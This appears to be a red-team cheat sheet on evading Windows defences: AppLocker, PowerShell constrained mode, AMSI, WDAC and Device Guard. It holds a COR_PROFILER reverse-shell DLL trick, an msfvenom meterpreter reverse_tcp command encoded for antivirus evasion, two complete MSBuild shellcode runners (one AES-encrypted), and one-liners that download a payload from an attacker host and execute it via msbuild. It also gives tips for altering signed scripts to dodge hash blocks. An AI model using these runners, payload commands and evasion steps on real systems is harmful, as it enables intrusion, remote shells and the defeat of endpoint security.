# Evasion & Bypasses

### AppLocker

Writable directories in C:\Windows:

* C:\windows\tasks

Use trusted binaries : [https://lolbas-project.github.io/](https://lolbas-project.github.io/) or find via:

```bash
findstr /C:"<autoElevate>true"
```

Then examine the library load order with procmon and look if you can write in any path where it looks for its libraries. If a path can be written to place a simple DLL there and it will be executed elevated. A nice [post](https://egre55.github.io/system-properties-uac-bypass/) about this. Common target binaries:

```bash
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
C:\Windows\SysWOW64\SystemPropertiesComputerName.exe
C:\Windows\SysWOW64\SystemPropertiesHardware.exe
C:\Windows\SysWOW64\SystemPropertiesProtection.exe
C:\Windows\SysWOW64\SystemPropertiesRemote.exe
```

#### COR Profile

Create a DLL payload like this [reverse shell](https://gist.github.com/xct/acacd58278f0448aeb1127aae41db1fd) and run:

```bash
set COR_ENABLE_PROFILING=1
COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}
set COR_PROFILER_PATH=<path>/pwn.dll
tzsync
```

#### Enumerate AppLocker Rules

This can be important because certain executeable names might be whitelisted!

```
Get-AppLockerPolicy -effective -xml
```

or

```
Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe
```

### PowerShell Constrained Language Mode (CLM)

All Powershell modules in Covenant already bypass AppLocker/CLM via its own PowerShell runspace.

Another options is: [https://github.com/p3nt4/PowerShdll](https://github.com/p3nt4/PowerShdll).

Also if Powershell v2 is installed we can bypass it too (because it does not support it).

### AMSI

AMSI loads Defender (or other AVs) into Powershell , .Net and others. A common bypass is to patch it in memory (it's being loaded as a DLL into a user process).

[https://github.com/rasta-mouse/AmsiScanBufferBypass](https://github.com/rasta-mouse/AmsiScanBufferBypass)

### Process Injection

Shelter [https://www.shellterproject.com/download/](https://www.shellterproject.com/download/) can inject shellcode into legit 32-Bit Executables and is likely to not get detected.

### MSBuild Shellcode

Generate payload for msbuild in csharp output format:

```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f csharp -e x86/shikata_ga_nai -i <num of iterations> > <out>.cs`
```

Put the buffer into the template (be sure to change payload buffer, buffer size and some strings for av evasion:

```markup
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Hello">
    <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
      <Code Type="Class" Language="cs">
      <![CDATA[
        using System;
        using System.Runtime.InteropServices;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        public class ClassExample :  Task, ITask
        {         
          private static UInt32 MEM_COMMIT = 0x1000;          
          private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
          [DllImport("kernel32")]
            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
          [DllImport("kernel32")]
            private static extern IntPtr CreateThread(            
            UInt32 lpThreadAttributes,
            UInt32 dwStackSize,
            UInt32 lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId           
            );
          [DllImport("kernel32")]
            private static extern UInt32 WaitForSingleObject(           
            IntPtr hHandle,
            UInt32 dwMilliseconds
            );          
          public override bool Execute()
          {
            byte[] shellcode = new byte[195] {};

              UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
              Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
              IntPtr hThread = IntPtr.Zero;
              UInt32 threadId = 0;
              IntPtr pinfo = IntPtr.Zero;
              hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
              WaitForSingleObject(hThread, 0xFFFFFFFF);
              return true;
          } 
        }     
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

Download & Execute:

```bash
Invoke-WebRequest "http://<ip>:<port>/<payload>.csproj" -OutFile "<outfile>.csproj"; C:\windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe .\<outfile>.csproj
```

### MSBuild Powershell

Use [https://gist.github.com/xct/72cf74cc1187e1c088758bf8b4dc4086](https://gist.github.com/xct/72cf74cc1187e1c088758bf8b4dc4086) and encode PowerShell Command with [https://gchq.github.io/CyberChef/#recipe=Encode\_text('UTF-16LE%20(1200)')To\_Base64('A-Za-z0-9%2B/%3D')\&input=d2hvYW1p](https://gchq.github.io/CyberChef/#recipe=Encode\_text\('UTF-16LE%20\(1200\)'\)To\_Base64\('A-Za-z0-9%2B/%3D'\)\&input=d2hvYW1p) . The C# part of this code is also great for embedding into fake windows gui programs (e.g. updater).

### MSBuild Encrypted Shellcode

We can combine an encrypted shellcode runner with MSBuild:

```csharp
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Hello">
    <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
      <Code Type="Class" Language="cs">
      <![CDATA[
        using System;
        using System.Runtime.InteropServices;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        using System.Diagnostics;
        using System.IO;
        using System.Runtime.InteropServices;
        using System.Security.Cryptography;
        using System.Threading;

        public class ClassExample :  Task, ITask
        {         
          [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
           static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
          [DllImport("kernel32.dll")]
           static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        public override bool Execute()
        {
            ManualResetEvent manualResetEvent = new ManualResetEvent(false);
            byte[] iv = new byte[16]  { 0x30, ... };
            byte[] key = new byte[32]  { 0xe6, ... };
            byte[] encrypted = new byte[512]  { 0x68, 0x9d, 0xc1, ...};

            Aes encryptor = Aes.Create();
            encryptor.Mode = CipherMode.CBC;
            encryptor.KeySize = 256;
            encryptor.BlockSize = 128;
            encryptor.Padding = PaddingMode.Zeros;
            encryptor.Key = key;
            encryptor.IV = iv;

            MemoryStream memoryStream = new MemoryStream();
            ICryptoTransform aesDecryptor = encryptor.CreateDecryptor();
            CryptoStream cryptoStream = new CryptoStream(memoryStream, aesDecryptor, CryptoStreamMode.Write);

            byte[] buf = null;
            try
            {
                cryptoStream.Write(encrypted, 0, encrypted.Length);
                cryptoStream.FlushFinalBlock();
                buf = memoryStream.ToArray();
            }
            finally
            {
                memoryStream.Close();
                cryptoStream.Close();
            }

            int size = buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, size);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            manualResetEvent.WaitOne();
            return true;
        }               
          
        }     
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

To execute, curl a "run.txt" such that:

```
iwr http://<ip>/build.xml -OutFile c:\programdata\build.xml
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe c:\programdata\build.xml
```

See C# Section for how to encrypt for this variant.

### WDAC

Check whether WDAC is enabled with `Get-ComputerInfo` (last 2 lines, "DeviceGuardCodeIntegrity"). The policies lives in C:\Windows\System32\CodeIntegrity or in the EFI System Partition, it has however no mounted drive by default:

```
Get-Partition
Get-Partition -PartitionNumber 2 | Set-Partition -NewDriverLetter X
Get-PSDrive
ls X:\EFI\Microsoft\Boot\*p7b
```

#### Convert via [WDACTools](https://github.com/mattifestation/WDACTools)

```
ConvertTo-WDACCodeIntegrityPolicy -BinaryFilePath binpath - XmlFilePath xmlpath
```

Then Check if there are some different to the recommendation: [https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules) .

[LOLBas ](https://lolbas-project.github.io/)has a lot of AWL bypasses, some of these work for code integrity too.

Powershell Scripts are often "Catalog" signed (C:\windows\system32\catroot), a signed list of hashes. &#x20;

Block rules for scripts are not very robust, small changes will change the hash and let the scripts run.

When we find a binary that uses powershell (and is allowed) we might be able to abuse the powershell module load order and place a malicious powershell file that gets auto loaded.

#### Bypasses

* [Pubprn.vbs](https://github.com/api0cradle/LOLBAS/blob/master/OSScripts/Pubprn.md)&#x20;
  * This needs a vulnerable version, Microsoft blocked a lot of versions. What we can do however is to use an old version and remove a newline in the signature if its embedded - this will stay valid signed but the hash changed, bypassing a hash based block

#### Resources&#x20;

* [https://www.youtube.com/watch?v=GU5OS7UN8nY](https://www.youtube.com/watch?v=GU5OS7UN8nY)

### Device Guard

* [http://www.exploit-monday.com/2017/07/bypassing-device-guard-with-dotnet-methods.html](http://www.exploit-monday.com/2017/07/bypassing-device-guard-with-dotnet-methods.html) (Mitigated with WDAC Policy "Enabled: Developer Mode Dynamic Trust")
